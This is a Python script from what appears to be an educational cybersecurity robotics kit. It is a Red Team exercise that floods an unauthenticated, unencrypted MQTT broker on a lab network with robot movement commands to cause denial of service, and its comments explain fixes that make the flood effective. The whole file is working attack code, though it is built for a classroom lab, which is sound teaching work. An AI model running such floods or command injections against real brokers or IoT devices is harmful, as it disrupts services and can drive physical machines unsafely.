# flood_reto4.py — Reto 4, Paso 2 (Red Team)
# Kit de Robotica Educativa en Ciberseguridad v2.0
# ESCOM / CEDOC 2025
#
# Ataque DoS basico contra el broker STUXNET — puerto 1883, SIN TLS
# y SIN autenticacion, igual que mosquitto_stuxnet.conf lo define
# (listener 1883 / allow_anonymous true).
#
# CORREGIDO — [fecha de esta sesión]: la versión anterior de este
# archivo se conectaba con TLS y credenciales al puerto 8883
# (ICSCERT) — funcionalmente un duplicado de flood_reto4_icscert.py.
# Eso contradice el propio Kit_Robotica_Segura_V2.ino, que documenta
# flood_reto4.py como el script del Red Team contra STUXNET:
#   "Red Team — STUXNET bajo flood (flood_reto4.py): ..."
# Contra el broker STUXNET (solo puerto 1883, sin TLS, sin auth),
# la versión anterior fallaba al conectar — el Paso 2 del Red Team
# no podía completarse. Esta versión corrige el puerto y quita
# TLS/credenciales para que coincida con mosquitto_stuxnet.conf.
#
# NO usar este script contra el broker ICSCERT (puerto 8883): al no
# tener TLS ni credenciales, el broker ICSCERT rechazaria la conexion
# de inmediato. Para el Blue Team (Paso BT-3) usar flood_reto4_icscert.py.

# CORREGIDO — [fecha de esta sesión] — FLOOD REAL:
#   La versión anterior de este archivo llamaba a cliente.publish()
#   en un bucle cerrado, pero NUNCA iniciaba el loop de red de
#   paho-mqtt (loop_start() / loop() / loop_forever()). Sin eso, la
#   librería no drena de verdad la cola de salida hacia el socket
#   TCP: publish() se limita a encolar en memoria de Python, y el
#   contador "enviados" sube aunque la mayoría de esos mensajes
#   nunca salgan por la red. Diagnóstico real: el script reportaba
#   "7324 mensajes/seg", pero un contador de diagnóstico agregado al
#   firmware del robot (mensajesRecibidos, incrementado en la primera
#   línea de _callbackMensaje()) mostró que solo ~120-140 mensajes/seg
#   llegaban de verdad — muy por debajo de lo necesario para saturar
#   loop() y bloquear el chequeo del sensor cada 150ms. Por eso el
#   robot seguía esquivando obstáculos durante el "flood".
#   flood_reto4_icscert.py (el script del Blue Team) sí tenía
#   loop_start() desde el principio — por eso ese sí logra un flood
#   real. Se agrega aquí el mismo mecanismo.
import paho.mqtt.client as mqtt
import time

IP_BROKER    = "192.168.10.105"
PUERTO       = 1883                    # Puerto STUXNET — sin TLS (VUL-1)
TOPIC        = "robot/armonia/cmd"
PAYLOAD      = '{"accion":"avanzar","velocidad":255}'
DURACION_SEG = 30

try:
    cliente = mqtt.Client()
    # Sin username_pw_set() — MODO_STUXNET no exige credenciales (VUL-2)
    # Sin tls_set()         — MODO_STUXNET no exige cifrado (VUL-1)
    cliente.connect(IP_BROKER, PUERTO, 60)
    cliente.loop_start()   # NUEVO — imprescindible para un flood real
    time.sleep(0.5)         # esperar a que la conexion quede lista
except Exception as e:
    print(f"\nERROR: {e}")
    print("Verificar: activar_stuxnet.bat activo en el computador docente.")
    print("Verificar: este computador esta conectado a la red Robot-Lab-01.")
    exit(1)

print("")
print("======================================================")
print("  flood_reto4.py — MODO STUXNET (Red Team)")
print("======================================================")
print(f"  Iniciando flood DoS contra {IP_BROKER}:{PUERTO}...")
print(f"  Topico    : {TOPIC}")
print(f"  TLS       : OFF | Auth: ninguna (VUL-1 + VUL-2 activas)")
print(f"  Duracion  : {DURACION_SEG} segundos")
print("======================================================")
print("")
print("Flood activo... (Ctrl+C para detener antes)")
print("")

inicio   = time.time()
contador = 0

try:
    while time.time() - inicio < DURACION_SEG:
        cliente.publish(TOPIC, PAYLOAD)
        contador += 1
except KeyboardInterrupt:
    print("\nDetenido manualmente (Ctrl+C).")

duracion_real = time.time() - inicio
cliente.loop_stop()   # NUEVO — detener el hilo de red antes de desconectar
cliente.disconnect()

print("")
print("═══════════ ESTADÍSTICAS DEL FLOOD ═════════")
print(f"  Mensajes enviados (contador local) : {contador}")
print(f"  Duración real                      : {duracion_real:.1f} seg")
print(f"  Mensajes/segundo (contador local)  : {contador/duracion_real:.0f}")
print(f"  Puerto usado                       : {PUERTO} (sin TLS, sin autenticación)")
print("═════════════════════════════════════════════")
print("")
print("NOTA: este contador cuenta llamadas a publish() en Python, no")
print("mensajes confirmados en el robot. Para el dato real, revisar")
print("en el Monitor Serial del ESP32 la linea [DIAG] mensajes_recibidos/seg")
print("mientras el flood esta activo.")
print("")
print("Anotar los valores en la tabla de la Hoja de Trabajo Red Team.")

